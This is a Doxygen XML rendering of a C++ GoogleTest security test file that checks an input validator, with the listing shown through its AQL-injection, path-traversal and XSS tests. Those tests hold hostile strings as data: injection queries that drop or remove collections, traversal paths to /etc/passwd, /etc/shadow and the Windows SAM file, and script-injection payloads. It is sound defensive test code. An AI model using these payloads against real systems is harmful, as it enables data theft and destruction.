@@ -1,0 +1,577 @@
+<?xml version='1.0' encoding='UTF-8' standalone='no'?>
+<doxygen xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="compound.xsd" version="1.17.0" xml:lang="en-US">
+  <compounddef id="test__input__validation__security_8cpp" kind="file" language="C++">
+    <compoundname>test_input_validation_security.cpp</compoundname>
+    <includes local="no">gtest/gtest.h</includes>
+    <includes local="yes">utils/input_validator.h</includes>
+    <includes local="no">string</includes>
+    <includes local="no">vector</includes>
+    <incdepgraph>
+      <node id="1">
+        <label>tests/security/test_input_validation_security.cpp</label>
+        <link refid="test__input__validation__security_8cpp"/>
+        <childnode refid="2" relation="include">
+        </childnode>
+        <childnode refid="3" relation="include">
+        </childnode>
+        <childnode refid="4" relation="include">
+        </childnode>
+        <childnode refid="5" relation="include">
+        </childnode>
+      </node>
+      <node id="2">
+        <label>gtest/gtest.h</label>
+      </node>
+      <node id="4">
+        <label>string</label>
+      </node>
+      <node id="3">
+        <label>utils/input_validator.h</label>
+      </node>
+      <node id="5">
+        <label>vector</label>
+      </node>
+    </incdepgraph>
+    <innerclass refid="class_input_validation_security_test" prot="public">InputValidationSecurityTest</innerclass>
+    <sectiondef kind="func">
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, AQLInjection_MaliciousQueries)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>AQLInjection_MaliciousQueries</type>
+        </param>
+        <briefdescription>
+<para>Test: AQL injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="33" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="33" bodyend="48"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a81060183d2a24a246bc8634b6344f09d" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, PathTraversal_AttackPatterns)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>PathTraversal_AttackPatterns</type>
+        </param>
+        <briefdescription>
+<para>Test: Path traversal prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="53" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="53" bodyend="70"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a7d85ffc5323d2efd8fa691909295bd4a" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, XSS_ScriptInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>XSS_ScriptInjection</type>
+        </param>
+        <briefdescription>
+<para>Test: XSS prevention in user input. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="75" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="75" bodyend="98"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1adfc493c024a7473af2decacc6e86eeae" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, CommandInjection_ShellCommands)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>CommandInjection_ShellCommands</type>
+        </param>
+        <briefdescription>
+<para>Test: Command injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="103" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="103" bodyend="119"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a35ae38ac960ce7e7c8ef8c8fffd4e1ef" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, NoSQLInjection_MongoDBStyle)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>NoSQLInjection_MongoDBStyle</type>
+        </param>
+        <briefdescription>
+<para>Test: NoSQL injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="124" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="124" bodyend="144"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a039a91d9e0bb9a56f7216d72de49986d" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, XXE_ExternalEntityInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>XXE_ExternalEntityInjection</type>
+        </param>
+        <briefdescription>
+<para>Test: XXE (XML External Entity) prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="149" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="149" bodyend="161"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1ad44686389a280fb2bd4d6f7710cb7fec" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, LDAPInjection_FilterBypass)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>LDAPInjection_FilterBypass</type>
+        </param>
+        <briefdescription>
+<para>Test: LDAP injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="166" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="166" bodyend="179"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a362e682ef3311c35caff3d0aba11cce7" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, EmailInjection_HeaderInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>EmailInjection_HeaderInjection</type>
+        </param>
+        <briefdescription>
+<para>Test: Email injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="184" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="184" bodyend="197"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a996096c6a14172199b6760aea105917c" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, URLInjection_OpenRedirect)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>URLInjection_OpenRedirect</type>
+        </param>
+        <briefdescription>
+<para>Test: URL injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="202" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="202" bodyend="218"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a66a0d0ac6ad5722943a780b194c63802" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, BufferOverflow_ExcessiveLength)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>BufferOverflow_ExcessiveLength</type>
+        </param>
+        <briefdescription>
+<para>Test: Buffer overflow prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="223" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="223" bodyend="229"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1ad44db6b1efe0ef8bbbd563e196a2c426" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, IntegerOverflow_BoundaryValues)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>IntegerOverflow_BoundaryValues</type>
+        </param>
+        <briefdescription>
+<para>Test: Integer overflow prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="234" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="234" bodyend="246"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1ab40f61ccca6abac7fb3abf29a7de5bdc" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, FormatStringInjection_SpecialCharacters)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>FormatStringInjection_SpecialCharacters</type>
+        </param>
+        <briefdescription>
+<para>Test: Format string injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="251" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="251" bodyend="266"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a1ffa6f55bcab5bafc25eb6072d43e601" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, Unicode_NormalizationBypass)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>Unicode_NormalizationBypass</type>
+        </param>
+        <briefdescription>
+<para>Test: Unicode normalization attacks. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="271" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="271" bodyend="286"/>
+      </memberdef>
+      <memberdef kind="function" id="test__input__validation__security_8cpp_1a6dd48711311314acdab906238a685f2d" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(InputValidationSecurityTest, CRLFInjection_HTTPHeaderSplitting)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref></type>
+        </param>
+        <param>
+          <type>CRLFInjection_HTTPHeaderSplitting</type>
+        </param>
+        <briefdescription>
+<para>Test: CRLF injection prevention. </para>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/security/test_input_validation_security.cpp" line="291" column="1" bodyfile="tests/security/test_input_validation_security.cpp" bodystart="291" bodyend="303"/>
+      </memberdef>
+    </sectiondef>
+    <briefdescription>
+    </briefdescription>
+    <detaileddescription>
+    </detaileddescription>
+    <programlisting>
+<codeline lineno="1"><highlight class="preprocessor">#include<sp/>&lt;gtest/gtest.h&gt;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="2"><highlight class="normal"></highlight><highlight class="preprocessor">#include<sp/>&quot;utils/input_validator.h&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="3"><highlight class="normal"></highlight><highlight class="preprocessor">#include<sp/>&lt;string&gt;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="4"><highlight class="normal"></highlight><highlight class="preprocessor">#include<sp/>&lt;vector&gt;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="5"><highlight class="normal"></highlight></codeline>
+<codeline lineno="6"><highlight class="normal"></highlight><highlight class="keyword">using<sp/>namespace<sp/></highlight><highlight class="normal"><ref refid="namespacethemis_1_1utils" kindref="compound">themis::utils</ref>;</highlight></codeline>
+<codeline lineno="7"><highlight class="normal"></highlight></codeline>
+<codeline lineno="18" refid="class_input_validation_security_test" refkind="compound"><highlight class="normal"></highlight><highlight class="keyword">class<sp/></highlight><highlight class="normal"><ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref><sp/>:<sp/></highlight><highlight class="keyword">public</highlight><highlight class="normal"><sp/>::testing::Test<sp/>{</highlight></codeline>
+<codeline lineno="19"><highlight class="normal"></highlight><highlight class="keyword">protected</highlight><highlight class="normal">:</highlight></codeline>
+<codeline lineno="20"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">void</highlight><highlight class="normal"><sp/><ref refid="class_input_validation_security_test_1abf555e372f72d8f5759e329810ab2586" kindref="member">SetUp</ref>()</highlight><highlight class="keyword"><sp/>override<sp/></highlight><highlight class="normal">{</highlight></codeline>
+<codeline lineno="21"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><ref refid="class_input_validation_security_test_1a29e165ddba9dba4aa8fa2718dfbae9ca" kindref="member">validator_</ref><sp/>=<sp/>std::make_unique&lt;InputValidator&gt;();</highlight></codeline>
+<codeline lineno="22"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="23"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="24"><highlight class="normal"><sp/><sp/><sp/><sp/>std::unique_ptr&lt;InputValidator&gt;<sp/><ref refid="class_input_validation_security_test_1a29e165ddba9dba4aa8fa2718dfbae9ca" kindref="member">validator_</ref>;</highlight></codeline>
+<codeline lineno="25"><highlight class="normal">};</highlight></codeline>
+<codeline lineno="26"><highlight class="normal"></highlight></codeline>
+<codeline lineno="27"><highlight class="normal"></highlight><highlight class="comment">//<sp/>existing<sp/>tests...</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="28"><highlight class="normal"></highlight></codeline>
+<codeline lineno="29"><highlight class="normal"></highlight></codeline>
+<codeline lineno="33"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>AQLInjection_MaliciousQueries)<sp/>{</highlight></codeline>
+<codeline lineno="34"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>malicious_queries<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="35"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;FOR<sp/>u<sp/>IN<sp/>users<sp/>FILTER<sp/>u.name<sp/>==<sp/>&apos;admin&apos;<sp/>OR<sp/>&apos;1&apos;=&apos;1&apos;<sp/>RETURN<sp/>u&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="36"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&apos;;<sp/>DROP<sp/>COLLECTION<sp/>users;<sp/>//&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="37"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;admin&apos;<sp/>OR<sp/>1=1--&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="38"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&apos;<sp/>UNION<sp/>SELECT<sp/>*<sp/>FROM<sp/>sensitive_data--&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="39"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&apos;;<sp/>REMOVE<sp/>u<sp/>IN<sp/>users;<sp/>//&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="40"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="41"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="42"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>query<sp/>:<sp/>malicious_queries)<sp/>{</highlight></codeline>
+<codeline lineno="43"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Validator<sp/>should<sp/>detect<sp/>injection<sp/>attempts</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="44"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateAQLQuery(query);</highlight></codeline>
+<codeline lineno="45"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="46"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Malicious<sp/>AQL<sp/>query<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>query;</highlight></codeline>
+<codeline lineno="47"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="48"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="49"><highlight class="normal"></highlight></codeline>
+<codeline lineno="53"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>PathTraversal_AttackPatterns)<sp/>{</highlight></codeline>
+<codeline lineno="54"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>malicious_paths<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="55"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;../../../etc/passwd&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="56"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;..\\..\\..\\windows\\system32\\config\\sam&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="57"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;....//....//....//etc/passwd&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="58"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;%2e%2e%2f%2e%2e%2f%2e%2e%2f&quot;</highlight><highlight class="normal">,<sp/><sp/></highlight><highlight class="comment">//<sp/>URL<sp/>encoded</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="59"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;..%252f..%252f..%252fetc/passwd&quot;</highlight><highlight class="normal">,<sp/><sp/></highlight><highlight class="comment">//<sp/>Double<sp/>URL<sp/>encoded</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="60"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;/../../../../../../etc/shadow&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="61"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;file:///etc/passwd&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="62"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;/proc/self/environ&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="63"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="64"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="65"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>path<sp/>:<sp/>malicious_paths)<sp/>{</highlight></codeline>
+<codeline lineno="66"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateFilePath(path);</highlight></codeline>
+<codeline lineno="67"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="68"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Path<sp/>traversal<sp/>attempt<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>path;</highlight></codeline>
+<codeline lineno="69"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="70"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="71"><highlight class="normal"></highlight></codeline>
+<codeline lineno="75"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>XSS_ScriptInjection)<sp/>{</highlight></codeline>
+<codeline lineno="76"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>xss_payloads<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="77"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="78"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&lt;img<sp/>src=x<sp/>onerror=alert(&apos;XSS&apos;)&gt;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="79"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;javascript:alert(&apos;XSS&apos;)&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="80"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&lt;iframe<sp/>src=javascript:alert(&apos;XSS&apos;)&gt;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="81"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&lt;svg/onload=alert(&apos;XSS&apos;)&gt;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="82"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&apos;-alert(&apos;XSS&apos;)-&apos;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="83"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;\&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="84"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&lt;body<sp/>onload=alert(&apos;XSS&apos;)&gt;&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="85"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="86"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="87"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>payload<sp/>:<sp/>xss_payloads)<sp/>{</highlight></codeline>
+<codeline lineno="88"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>std::string<sp/>sanitized<sp/>=<sp/>validator_-&gt;sanitizeForHTML(payload);</highlight></codeline>
+<codeline lineno="89"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="90"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Sanitized<sp/>output<sp/>should<sp/>not<sp/>contain<sp/>script<sp/>tags<sp/>or<sp/>event<sp/>handlers</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="91"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(sanitized.find(</highlight><highlight class="stringliteral">&quot;&lt;script&quot;</highlight><highlight class="normal">)<sp/>==<sp/>std::string::npos)<sp/></highlight></codeline>
+<codeline lineno="92"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Script<sp/>tags<sp/>should<sp/>be<sp/>removed/escaped&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="93"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(sanitized.find(</highlight><highlight class="stringliteral">&quot;javascript:&quot;</highlight><highlight class="normal">)<sp/>==<sp/>std::string::npos)</highlight></codeline>
+<codeline lineno="94"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Javascript<sp/>protocol<sp/>should<sp/>be<sp/>removed&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="95"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(sanitized.find(</highlight><highlight class="stringliteral">&quot;onerror&quot;</highlight><highlight class="normal">)<sp/>==<sp/>std::string::npos)</highlight></codeline>
+<codeline lineno="96"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Event<sp/>handlers<sp/>should<sp/>be<sp/>removed&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="97"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="98"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="99"><highlight class="normal"></highlight></codeline>
